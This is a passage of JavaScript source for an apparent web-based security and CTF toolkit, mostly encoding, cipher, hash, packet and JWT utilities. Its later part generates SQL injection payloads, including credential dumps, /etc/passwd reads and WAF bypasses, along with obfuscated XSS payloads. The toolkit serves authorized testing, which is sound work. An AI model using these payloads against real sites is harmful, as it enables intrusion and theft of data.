                    <div class="input-group">
                        <label>Output Format:</label>
                        <select id="outputFormat">
                            <option value="string">String</option>
                            <option value="hex">Hex</option>
                            <option value="c_array">C Array</option>
                            <option value="python">Python Bytes</option>
                            <option value="javascript">JavaScript Array</option>
                        </select>
                    </div>
                    <button class="btn" onclick="generatePattern()">Generate Pattern</button>
                    <div class="input-group">
                        <label>Find Offset:</label>
                        <input type="text" id="offsetValue" placeholder="Enter 4-byte sequence or hex">
                        <button class="btn" onclick="findPatternOffset()">Find Offset</button>
                    </div>
                    <div class="input-group">
                        <label>Generated Pattern:</label>
                        <div id="patternOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'offset-finder':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Generated Pattern:</label>
                        <textarea id="offsetPattern" rows="4" placeholder="Paste the pattern you used"></textarea>
                    </div>
                    <div class="input-group">
                        <label>Crash Value (EIP/RIP):</label>
                        <input type="text" id="crashValue" placeholder="e.g., 41414141 or 0x41414141">
                    </div>
                    <div class="input-group">
                        <label>Value Format:</label>
                        <select id="valueFormat">
                            <option value="hex">Hexadecimal</option>
                            <option value="ascii">ASCII</option>
                            <option value="little_endian">Little Endian</option>
                            <option value="big_endian">Big Endian</option>
                        </select>
                    </div>
                    <button class="btn" onclick="findOffset()">Find Offset</button>
                    <div class="input-group">
                        <label>Offset Result:</label>
                        <div id="offsetResult" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'pcap-analyzer':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Upload PCAP File:</label>
                        <input type="file" id="pcapFile" accept=".pcap,.pcapng,.cap">
                    </div>
                    <div class="input-group">
                        <label>Analysis Type:</label>
                        <select id="pcapAnalysisType">
                            <option value="overview">Traffic Overview</option>
                            <option value="protocols">Protocol Analysis</option>
                            <option value="conversations">Conversations</option>
                            <option value="dns">DNS Analysis</option>
                            <option value="http">HTTP Analysis</option>
                            <option value="suspicious">Suspicious Activity</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>Filter:</label>
                        <input type="text" id="pcapFilter" placeholder="e.g., tcp.port == 80 or dns">
                    </div>
                    <button class="btn" onclick="analyzePcap()">Analyze PCAP</button>
                    <div class="input-group">
                        <label>Analysis Results:</label>
                        <div id="pcapOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'packet-viewer':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Packet Data (Hex):</label>
                        <textarea id="packetHex" rows="6" placeholder="Enter packet data in hexadecimal format"></textarea>
                    </div>
                    <div class="input-group">
                        <label>Protocol:</label>
                        <select id="packetProtocol">
                            <option value="ethernet">Ethernet</option>
                            <option value="ip">IP</option>
                            <option value="tcp">TCP</option>
                            <option value="udp">UDP</option>
                            <option value="http">HTTP</option>
                            <option value="dns">DNS</option>
                        </select>
                    </div>
                    <button class="btn" onclick="parsePacket()">Parse Packet</button>
                    <div class="input-group">
                        <label>Packet Analysis:</label>
                        <div id="packetOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        case 'lsb-extractor':
            return `
                <div class="tool-interface">
                    <div class="input-group">
                        <label>Upload Image:</label>
                        <input type="file" id="lsbImage" accept="image/*">
                    </div>
                    <div class="input-group">
                        <label>Extraction Method:</label>
                        <select id="lsbMethod">
                            <option value="sequential">Sequential LSB</option>
                            <option value="interleaved">Interleaved RGB</option>
                            <option value="red_only">Red Channel Only</option>
                            <option value="green_only">Green Channel Only</option>
                            <option value="blue_only">Blue Channel Only</option>
                            <option value="custom_planes">Custom Bit Planes</option>
                        </select>
                    </div>
                    <div class="input-group" id="bitPlanesGroup" style="display: none;">
                        <label>Bit Planes (0=LSB, 7=MSB):</label>
                        <input type="text" id="bitPlanes" placeholder="0,1,2" value="0">
                    </div>
                    <div class="input-group">
                        <label>Output Format:</label>
                        <select id="lsbOutputFormat">
                            <option value="text">Text</option>
                            <option value="hex">Hexadecimal</option>
                            <option value="binary">Binary</option>
                            <option value="file">Save as File</option>
                        </select>
                    </div>
                    <button class="btn" onclick="extractLSBData()">Extract Data</button>
                    <div class="input-group">
                        <label>Extracted Data:</label>
                        <div id="lsbExtractorOutput" class="output-area"></div>
                    </div>
                </div>
            `;

        default:
            return `
                <div class="tool-interface">
                    <div class="message info">
                        <h4>Tool: ${getToolTitle(toolName)}</h4>
                        <p>This tool is currently under development. It will include advanced functionality for ${toolName} analysis and manipulation.</p>
                        <p><strong>Features coming soon:</strong></p>
                        <ul style="margin-left: 2rem; margin-top: 1rem;">
                            <li>Advanced ${toolName} processing</li>
                            <li>Multiple format support</li>
                            <li>Real-time analysis</li>
                            <li>Export functionality</li>
                        </ul>
                    </div>
                    <div class="input-group">
                        <label>Input:</label>
                        <textarea rows="4" placeholder="Input will be processed here..."></textarea>
                    </div>
                    <button class="btn" onclick="showMessage('This tool is coming soon!', 'info')">Process</button>
                    <div class="input-group">
                        <label>Output:</label>
                        <div class="output-area">Output will appear here...</div>
                    </div>
                </div>
            `;
    }
}

// Tool initialization
function initializeTool(toolName) {
    // Tool-specific initialization can be added here
    console.log(`Initialized tool: ${toolName}`);
}

// Base64 functions
function base64Encode() {
    const input = document.getElementById('base64Input').value;
    const output = document.getElementById('base64Output');
    try {
        const encoded = btoa(unescape(encodeURIComponent(input)));
        output.textContent = encoded;
        showMessage('Text encoded successfully!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid input for encoding';
        showMessage('Encoding failed!', 'error');
    }
}

function base64Decode() {
    const input = document.getElementById('base64Input').value;
    const output = document.getElementById('base64Output');
    try {
        const decoded = decodeURIComponent(escape(atob(input)));
        output.textContent = decoded;
        showMessage('Base64 decoded successfully!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid Base64 input';
        showMessage('Decoding failed!', 'error');
    }
}

function clearBase64() {
    document.getElementById('base64Input').value = '';
    document.getElementById('base64Output').textContent = '';
}

// Hash functions
async function generateHash() {
    const text = document.getElementById('textToHash').value;
    const hashType = document.getElementById('hashType').value;
    const output = document.getElementById('generatedHash');

    if (!text) {
        showMessage('Please enter text to hash', 'error');
        return;
    }

    try {
        const encoder = new TextEncoder();
        const data = encoder.encode(text);
        let hashBuffer;

        switch(hashType) {
            case 'md5':
                // MD5 implementation (simplified)
                output.textContent = await simpleHash(text, 'md5');
                break;
            case 'sha1':
                hashBuffer = await crypto.subtle.digest('SHA-1', data);
                break;
            case 'sha256':
                hashBuffer = await crypto.subtle.digest('SHA-256', data);
                break;
            case 'sha512':
                hashBuffer = await crypto.subtle.digest('SHA-512', data);
                break;
        }

        if (hashBuffer) {
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
            output.textContent = hashHex;
        }

        showMessage(`${hashType.toUpperCase()} hash generated successfully!`, 'success');
    } catch (error) {
        output.textContent = 'Error generating hash';
        showMessage('Hash generation failed!', 'error');
    }
}

function analyzeHash() {
    const hash = document.getElementById('hashInput').value.trim();
    const output = document.getElementById('hashOutput');

    if (!hash) {
        showMessage('Please enter a hash to analyze', 'error');
        return;
    }

    const analysis = identifyHashType(hash);
    output.innerHTML = `
        <strong>Hash Analysis:</strong><br>
        Length: ${hash.length} characters<br>
        Possible Types: ${analysis.types.join(', ')}<br>
        Most Likely: ${analysis.mostLikely}<br>
        Charset: ${analysis.charset}<br>
        <br>
        <strong>Recommendations:</strong><br>
        ${analysis.recommendations.join('<br>')}
    `;

    showMessage('Hash analyzed successfully!', 'success');
}

function identifyHashType(hash) {
    const length = hash.length;
    const charset = /^[a-f0-9]+$/i.test(hash) ? 'Hexadecimal' : 'Mixed/Unknown';
    let types = [];
    let mostLikely = 'Unknown';
    let recommendations = [];

    switch(length) {
        case 32:
            if (charset === 'Hexadecimal') {
                types = ['MD5', 'MD4', 'MD2'];
                mostLikely = 'MD5';
                recommendations = ['Try online MD5 rainbow tables', 'Use hashcat with MD5 mode'];
            }
            break;
        case 40:
            if (charset === 'Hexadecimal') {
                types = ['SHA-1', 'MySQL5'];
                mostLikely = 'SHA-1';
                recommendations = ['Try SHA-1 rainbow tables', 'Use hashcat with SHA-1 mode'];
            }
            break;
        case 64:
            if (charset === 'Hexadecimal') {
                types = ['SHA-256', 'SHA3-256'];
                mostLikely = 'SHA-256';
                recommendations = ['Try dictionary attacks', 'Use hashcat with SHA-256 mode'];
            }
            break;
        case 128:
            if (charset === 'Hexadecimal') {
                types = ['SHA-512', 'SHA3-512'];
                mostLikely = 'SHA-512';
                recommendations = ['Try dictionary attacks', 'Use hashcat with SHA-512 mode'];
            }
            break;
        default:
            types = ['Unknown hash type'];
            recommendations = ['Check hash length and format', 'Verify hash integrity'];
    }

    return { types, mostLikely, charset, recommendations };
}

// Caesar cipher functions
function caesarEncrypt() {
    const text = document.getElementById('caesarInput').value;
    const shift = parseInt(document.getElementById('caesarShift').value) || 0;
    const output = document.getElementById('caesarOutput');

    const result = caesarCipher(text, shift);
    output.textContent = result;
    showMessage('Text encrypted successfully!', 'success');
}

function caesarDecrypt() {
    const text = document.getElementById('caesarInput').value;
    const shift = parseInt(document.getElementById('caesarShift').value) || 0;
    const output = document.getElementById('caesarOutput');

    const result = caesarCipher(text, -shift);
    output.textContent = result;
    showMessage('Text decrypted successfully!', 'success');
}

function caesarBruteForce() {
    const text = document.getElementById('caesarInput').value;
    const output = document.getElementById('caesarOutput');

    let results = 'Brute Force Results:\n\n';
    for (let i = 0; i < 26; i++) {
        const decrypted = caesarCipher(text, -i);
        results += `Shift ${i}: ${decrypted}\n`;
    }

    output.textContent = results;
    showMessage('Brute force completed!', 'success');
}

function caesarCipher(text, shift) {
    return text.replace(/[a-zA-Z]/g, function(char) {
        const start = char <= 'Z' ? 65 : 97;
        const code = char.charCodeAt(0);
        let shifted = ((code - start + shift + 26) % 26) + start;
        return String.fromCharCode(shifted);
    });
}

// Hex conversion functions
function textToHex() {
    const text = document.getElementById('hexInput').value;
    const output = document.getElementById('hexOutput');

    const hex = Array.from(text)
        .map(char => char.charCodeAt(0).toString(16).padStart(2, '0'))
        .join(' ');

    output.textContent = hex;
    showMessage('Text converted to hex successfully!', 'success');
}

function hexToText() {
    const hex = document.getElementById('hexInput').value.replace(/\s+/g, '');
    const output = document.getElementById('hexOutput');

    if (!hex) {
        showMessage('Please enter hex data', 'error');
        return;
    }

    if (!/^[0-9a-fA-F]*$/.test(hex)) {
        output.textContent = 'Error: Invalid hex characters';
        showMessage('Conversion failed! Use only 0-9 and A-F', 'error');
        return;
    }

    try {
        const text = hex.match(/.{1,2}/g)
            .map(byte => String.fromCharCode(parseInt(byte, 16)))
            .join('');
        output.textContent = text;
        showMessage('Hex converted to text successfully!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid hex input';
        showMessage('Conversion failed!', 'error');
    }
}

function hexToDecimal() {
    const hex = document.getElementById('hexInput').value.replace(/\s+/g, '');
    const output = document.getElementById('hexOutput');

    try {
        const decimal = parseInt(hex, 16);
        output.textContent = decimal.toString();
        showMessage('Hex converted to decimal successfully!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid hex input';
        showMessage('Conversion failed!', 'error');
    }
}

function decimalToHex() {
    const decimal = document.getElementById('hexInput').value;
    const output = document.getElementById('hexOutput');

    try {
        const hex = parseInt(decimal).toString(16).toUpperCase();
        output.textContent = hex;
        showMessage('Decimal converted to hex successfully!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid decimal input';
        showMessage('Conversion failed!', 'error');
    }
}

// URL encoding functions
function urlEncode() {
    const text = document.getElementById('urlInput').value;
    const output = document.getElementById('urlOutput');

    const encoded = encodeURIComponent(text);
    output.textContent = encoded;
    showMessage('URL encoded successfully!', 'success');
}

function urlDecode() {
    const text = document.getElementById('urlInput').value;
    const output = document.getElementById('urlOutput');

    try {
        const decoded = decodeURIComponent(text);
        output.textContent = decoded;
        showMessage('URL decoded successfully!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid URL encoding';
        showMessage('Decoding failed!', 'error');
    }
}

// Vigenère cipher functions
function vigenereEncrypt() {
    const text = document.getElementById('vigenereInput').value.toUpperCase();
    const key = document.getElementById('vigenereKey').value.toUpperCase();
    const output = document.getElementById('vigenereOutput');

    if (!key) {
        showMessage('Please enter a key', 'error');
        return;
    }

    const result = vigenereProcess(text, key, true);
    output.textContent = result;
    showMessage('Text encrypted successfully!', 'success');
}

function vigenereDecrypt() {
    const text = document.getElementById('vigenereInput').value.toUpperCase();
    const key = document.getElementById('vigenereKey').value.toUpperCase();
    const output = document.getElementById('vigenereOutput');

    if (!key) {
        showMessage('Please enter a key', 'error');
        return;
    }

    const result = vigenereProcess(text, key, false);
    output.textContent = result;
    showMessage('Text decrypted successfully!', 'success');
}

function vigenereProcess(text, key, encrypt) {
    let result = '';
    let keyIndex = 0;

    for (let i = 0; i < text.length; i++) {
        const char = text[i];

        if (char.match(/[A-Z]/)) {
            const textCode = char.charCodeAt(0) - 65;
            const keyCode = key[keyIndex % key.length].charCodeAt(0) - 65;

            let newCode;
            if (encrypt) {
                newCode = (textCode + keyCode) % 26;
            } else {
                newCode = (textCode - keyCode + 26) % 26;
            }

            result += String.fromCharCode(newCode + 65);
            keyIndex++;
        } else {
            result += char;
        }
    }

    return result;
}

// Morse code functions
function textToMorse() {
    const text = document.getElementById('morseInput').value.toUpperCase();
    const output = document.getElementById('morseOutput');

    const morseCode = {
        'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.',
        'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..',
        'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.',
        'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-',
        'Y': '-.--', 'Z': '--..', '0': '-----', '1': '.----', '2': '..---',
        '3': '...--', '4': '....-', '5': '.....', '6': '-....', '7': '--...',
        '8': '---..', '9': '----.', ' ': '/'
    };

    const morse = text.split('').map(char => morseCode[char] || char).join(' ');
    output.textContent = morse;
    showMessage('Text converted to Morse code successfully!', 'success');
}

function morseToText() {
    const morse = document.getElementById('morseInput').value;
    const output = document.getElementById('morseOutput');

    const morseToChar = {
        '.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D', '.': 'E', '..-.': 'F',
        '--.': 'G', '....': 'H', '..': 'I', '.---': 'J', '-.-': 'K', '.-..': 'L',
        '--': 'M', '-.': 'N', '---': 'O', '.--.': 'P', '--.-': 'Q', '.-.': 'R',
        '...': 'S', '-': 'T', '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X',
        '-.--': 'Y', '--..': 'Z', '-----': '0', '.----': '1', '..---': '2',
        '...--': '3', '....-': '4', '.....': '5', '-....': '6', '--...': '7',
        '---..': '8', '----.': '9', '/': ' '
    };

    const words = morse.split('/');
    const text = words.map(word => 
        word.trim().split(' ').map(code => morseToChar[code] || '?').join('')
    ).join(' ');

    output.textContent = text;
    showMessage('Morse code converted to text successfully!', 'success');
}

// Request builder function
function buildRequest() {
    const method = document.getElementById('httpMethod').value;
    const url = document.getElementById('requestUrl').value;
    const headers = document.getElementById('requestHeaders').value;
    const body = document.getElementById('requestBody').value;
    const output = document.getElementById('requestOutput');

    if (!url) {
        showMessage('Please enter a URL', 'error');
        return;
    }

    let request = `${method} ${url}\n`;

    try {
        if (headers) {
            const headerObj = JSON.parse(headers);
            Object.entries(headerObj).forEach(([key, value]) => {
                request += `${key}: ${value}\n`;
            });
        }
    } catch (error) {
        showMessage('Invalid JSON in headers', 'error');
        return;
    }

    if (body && (method === 'POST' || method === 'PUT')) {
        request += `\n${body}`;
    }

    output.textContent = request;
    showMessage('HTTP request built successfully!', 'success');
}

// Utility functions
async function simpleHash(text, algorithm) {
    // Simplified hash implementation for demo
    let hash = 0;
    for (let i = 0; i < text.length; i++) {
        const char = text.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash; // Convert to 32-bit integer
    }
    return Math.abs(hash).toString(16).padStart(8, '0');
}

function showMessage(message, type) {
    // Create message element
    const messageEl = document.createElement('div');
    messageEl.className = `message ${type}`;
    messageEl.textContent = message;

    // Insert at top of modal body
    const modalBody = document.getElementById('modalBody');
    modalBody.insertBefore(messageEl, modalBody.firstChild);

    // Remove after 3 seconds
    setTimeout(() => {
        if (messageEl.parentNode) {
            messageEl.parentNode.removeChild(messageEl);
        }
    }, 3000);
}

// JWT Decoder functions
function decodeJWT() {
    const token = document.getElementById('jwtInput').value.trim();
    const output = document.getElementById('jwtOutput');

    if (!token) {
        showMessage('Please enter a JWT token', 'error');
        return;
    }

    try {
        const parts = token.split('.');
        if (parts.length !== 3) {
            throw new Error('Invalid JWT format - must have 3 parts separated by dots');
        }

        // Add padding if needed for base64 decoding
        const addPadding = (str) => {
            while (str.length % 4) {
                str += '=';
            }
            return str;
        };

        const header = JSON.parse(atob(addPadding(parts[0].replace(/-/g, '+').replace(/_/g, '/'))));
        const payload = JSON.parse(atob(addPadding(parts[1].replace(/-/g, '+').replace(/_/g, '/'))));

        let result = `<strong>Header:</strong>\n${JSON.stringify(header, null, 2)}\n\n`;
        result += `<strong>Payload:</strong>\n${JSON.stringify(payload, null, 2)}\n\n`;
        result += `<strong>Signature:</strong>\n${parts[2]}\n\n`;
        
        // Add expiration check if present
        if (payload.exp) {
            const expDate = new Date(payload.exp * 1000);
            const isExpired = Date.now() > payload.exp * 1000;
            result += `<strong>Expiration:</strong>\n${expDate.toLocaleString()} ${isExpired ? '(EXPIRED)' : '(VALID)'}\n\n`;
        }

        // Add issued at check if present
        if (payload.iat) {
            const iatDate = new Date(payload.iat * 1000);
            result += `<strong>Issued At:</strong>\n${iatDate.toLocaleString()}\n\n`;
        }

        // Add not before check if present
        if (payload.nbf) {
            const nbfDate = new Date(payload.nbf * 1000);
            const isActive = Date.now() > payload.nbf * 1000;
            result += `<strong>Not Before:</strong>\n${nbfDate.toLocaleString()} ${isActive ? '(ACTIVE)' : '(NOT YET ACTIVE)'}\n\n`;
        }

        // Security analysis
        result += `<strong>Security Analysis:</strong>\n`;
        if (header.alg === 'none') {
            result += `⚠️ WARNING: Algorithm is 'none' - token is not signed!\n`;
        } else if (header.alg.startsWith('HS')) {
            result += `🔑 HMAC-based signature (${header.alg})\n`;
        } else if (header.alg.startsWith('RS') || header.alg.startsWith('ES')) {
            result += `🔐 Public key signature (${header.alg})\n`;
        }

        // Check for common vulnerabilities
        if (token.includes('..')) {
            result += `⚠️ WARNING: Double dot detected - possible directory traversal attempt\n`;
        }

        output.innerHTML = `<pre>${result}</pre>`;
        showMessage('JWT decoded successfully!', 'success');
    } catch (error) {
        output.textContent = `Error: ${error.message}`;
        showMessage('JWT decoding failed!', 'error');
    }
}

// SQL Injection functions
function generateSQLPayloads() {
    const url = document.getElementById('sqlUrl').value;
    const param = document.getElementById('sqlParam').value;
    const type = document.getElementById('sqlPayloadType').value;
    const output = document.getElementById('sqlOutput');

    if (!url || !param) {
        showMessage('Please enter URL and parameter', 'error');
        return;
    }

    const payloads = {
        union: [
            // Basic UNION payloads
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT 1,2,3--",
            "' UNION SELECT user(),database(),version()--",
            "' UNION SELECT table_name,column_name,1 FROM information_schema.columns--",
            "' UNION SELECT schema_name,table_name,column_name FROM information_schema.columns--",
            "' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables WHERE table_schema=database()--",
            "' UNION SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT username,password,email FROM users--",
            "' UNION SELECT load_file('/etc/passwd'),2,3--",
            "' UNION SELECT @@version,@@datadir,@@basedir--",
            "' UNION SELECT current_user(),session_user(),system_user()--",
            // Advanced UNION with WAF bypass
            "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
            "' UNION/**/SELECT/**/1,2,3--",
            "' UnIoN SeLeCt 1,2,3--",
            "' %55nion %53elect 1,2,3--"
        ],
        boolean: [
            // Basic boolean-based
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a'--",
            "' AND 'a'='b'--",
            "' AND substring(user(),1,1)='r'--",
            "' AND substring(database(),1,1)='t'--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>100--",
            "' AND ASCII(SUBSTRING(user(),1,1))>64--",
            "' AND ORD(MID(user(),1,1))>64--",
            "' AND LENGTH(database())>5--",
            "' AND (SELECT substring(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1)='u'--",
            // Advanced boolean with bypass
            "' AND/**/1=1--",
            "' AnD 1=1--",
            "' %41ND 1=1--",
            "' AND(1)=(1)--"
        ],
        time: [
            // MySQL time-based
            "' AND (SELECT SLEEP(5))--",
            "' AND BENCHMARK(5000000,MD5(1))--",
            "' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--",
            "' AND IF(1=1,SLEEP(5),0)--",
            "' AND IF(ASCII(SUBSTRING(user(),1,1))>64,SLEEP(5),0)--",
            "' AND IF(LENGTH(database())>5,SLEEP(5),0)--",
            // SQL Server time-based
            "'; WAITFOR DELAY '00:00:05'--",
            "'; IF (1=1) WAITFOR DELAY '00:00:05'--",
            "'; IF (ASCII(SUBSTRING(user,1,1))>64) WAITFOR DELAY '00:00:05'--",
            // PostgreSQL time-based
            "'; SELECT pg_sleep(5)--",
            "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
            "' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)--",
            // Oracle time-based
            "' AND 1=(SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--",
            // Generic time-based
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ],
        error: [
            // MySQL error-based
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)--",
            "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)--",
            // SQL Server error-based
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND 1=CONVERT(int, (SELECT user))--",
            "' AND 1=CONVERT(int, (SELECT db_name()))--",
            "' AND 1=CAST((SELECT @@version) as int)--",
            // PostgreSQL error-based
            "' AND 1=CAST((SELECT version()) as int)--",
            "' AND 1=CAST((SELECT current_user) as int)--",
            "' AND 1=CAST((SELECT current_database()) as int)--",
            // Oracle error-based
            "' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1))--",
            "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))) FROM dual)--"
        ]
    };

    let result = `<strong>${type.toUpperCase()} SQL Injection Payloads:</strong>\n\n`;
    result += `Target: ${url}\nParameter: ${param}\nPayload Type: ${type}\n`;
    result += `Date Generated: ${new Date().toLocaleString()}\n\n`;
    result += `<strong>Payloads (${payloads[type].length} total):</strong>\n\n`;

    payloads[type].forEach((payload, index) => {
        try {
            const escapedParam = param.replace(/[-/\\^$*+?.()|[\]{}]/g, '\\$&');
            let testUrl;
            
            if (url.includes(`${param}=`)) {
                testUrl = url.replace(new RegExp(`(${escapedParam}=)[^&]*`), `$1${encodeURIComponent(payload)}`);
            } else {
                const separator = url.includes('?') ? '&' : '?';
                testUrl = `${url}${separator}${param}=${encodeURIComponent(payload)}`;
            }
            
            result += `${(index + 1).toString().padStart(2, '0')}. ${payload}\n`;
            result += `    URL: ${testUrl}\n`;
            result += `    Description: ${getPayloadDescription(payload, type)}\n\n`;
        } catch (error) {
            result += `${(index + 1).toString().padStart(2, '0')}. ${payload}\n`;
            result += `    Error generating URL: ${error.message}\n\n`;
        }
    });

    // Add testing instructions
    result += `<strong>Testing Instructions:</strong>\n`;
    result += `1. Copy the URLs and test them in your browser or with curl\n`;
    result += `2. Look for database errors, different response times, or content changes\n`;
    result += `3. For time-based: Monitor response time delays\n`;
    result += `4. For error-based: Check for database error messages\n`;
    result += `5. For union-based: Look for data from other tables\n`;
    result += `6. For boolean-based: Compare responses between true/false conditions\n\n`;

    result += `<strong>Warning:</strong> Only test on applications you own or have explicit permission to test.`;

    output.innerHTML = `<pre>${result}</pre>`;
    showMessage('SQL payloads generated successfully!', 'success');
}

function getPayloadDescription(payload, type) {
    const descriptions = {
        union: {
            "' UNION SELECT 1,2,3--": "Basic UNION test with numbered columns",
            "' UNION SELECT NULL,NULL,NULL--": "NULL-based UNION to avoid type errors",
            "' UNION SELECT user(),database(),version()--": "Extract database information",
            "' UNION SELECT table_name,column_name,1 FROM information_schema.columns--": "Enumerate database structure"
        },
        boolean: {
            "' AND 1=1--": "True condition test",
            "' AND 1=2--": "False condition test",
            "' AND substring(user(),1,1)='r'--": "Character-by-character user extraction"
        },
        time: {
            "' AND (SELECT SLEEP(5))--": "MySQL 5-second delay",
            "'; WAITFOR DELAY '00:00:05'--": "SQL Server 5-second delay",
            "'; SELECT pg_sleep(5)--": "PostgreSQL 5-second delay"
        },
        error: {
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--": "MySQL EXTRACTVALUE error with user info",
            "' AND 1=CONVERT(int, (SELECT @@version))--": "SQL Server conversion error with version"
        }
    };

    return descriptions[type]?.[payload] || "Advanced SQL injection payload";
}

// XSS Payload functions
function generateXSSPayloads() {
    const context = document.getElementById('xssContext').value;
    const bypass = document.getElementById('xssBypass').value;
    const output = document.getElementById('xssOutput');

    const payloads = {
        html: {
            basic: [
                "<script>alert('XSS')</script>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<script>alert(document.domain)</script>",
                "<script>alert(document.cookie)</script>",
                "<script>confirm('XSS')</script>",
                "<script>prompt('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<img src=x onerror=alert(1)>",
                "<img src=x onerror=prompt(1)>",
                "<svg onload=alert('XSS')>",
                "<svg onload=alert(1)>",
                "<svg onload=confirm(1)>",
                "<iframe src=javascript:alert('XSS')>",
                "<iframe src=javascript:alert(1)>",
                "<body onload=alert('XSS')>",
                "<div onmouseover=alert('XSS')>hover</div>",
                "<input autofocus onfocus=alert('XSS')>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>",
                "<video><source onerror=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "<meter value=2 min=0 max=10 onmouseover=alert('XSS')>2 out of 10</meter>"
            ],
            filter: [
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<SCRIPT>alert('XSS')</SCRIPT>",
                "<script>alert('XSS')</script>",
                "<sCrIpT>alert('XSS')</ScRiPt>",
                "<img src=x onerror=prompt`XSS`>",
                "<img src=x onerror=alert`XSS`>",
                "<img src=x onerror=confirm`XSS`>",
                "<svg/onload=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<svg onload=alert(1)>",
                "<IMG SRC=x ONERROR=alert('XSS')>",
                "<img src=x onerror=eval('alert(1)')>",
                "<img src=x onerror=Function('alert(1)')()>",
                "javascript:alert('XSS')",
                "javascript:alert(1)",
                "JavaScript:alert('XSS')",
                "JAVASCRIPT:alert('XSS')",
                "vbscript:msgbox('XSS')",
                "<img src=x onerror=setTimeout(alert,0,'XSS')>",
                "<img src=x onerror=setInterval(alert,100,'XSS')>",
                "<img src=x onerror=requestAnimationFrame(()=>alert('XSS'))>",
                "<iframe srcdoc='<script>alert(1)</script>'>",
                "<iframe src=data:text/html,<script>alert(1)</script>>",
                "<object data=javascript:alert('XSS')>",
                "<embed src=javascript:alert('XSS')>"
            ],
            waf: [
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
                "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
                "<script>Function('al'+'ert(1)')();</script>",
                "<script>window['al'+'ert'](1)</script>",
                "<script>top['al'+'ert'](1)</script>",
                "<script>parent['al'+'ert'](1)</script>",
                "<script>self['al'+'ert'](1)</script>",
                "<script>this['al'+'ert'](1)</script>",
                "<script>globalThis['al'+'ert'](1)</script>",
                "<script>[].constructor.constructor('alert(1)')()</script>",
                "<script>''['constructor']['constructor']('alert(1)')()</script>",
                "<script>(function(){return'alert(1)'})()['constructor']['constructor']('alert(1)')()</script>",
                "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
                "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
                "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,88,83,83,41))>",
                "<iframe src=data:text/html,<script>alert('XSS')</script>>",
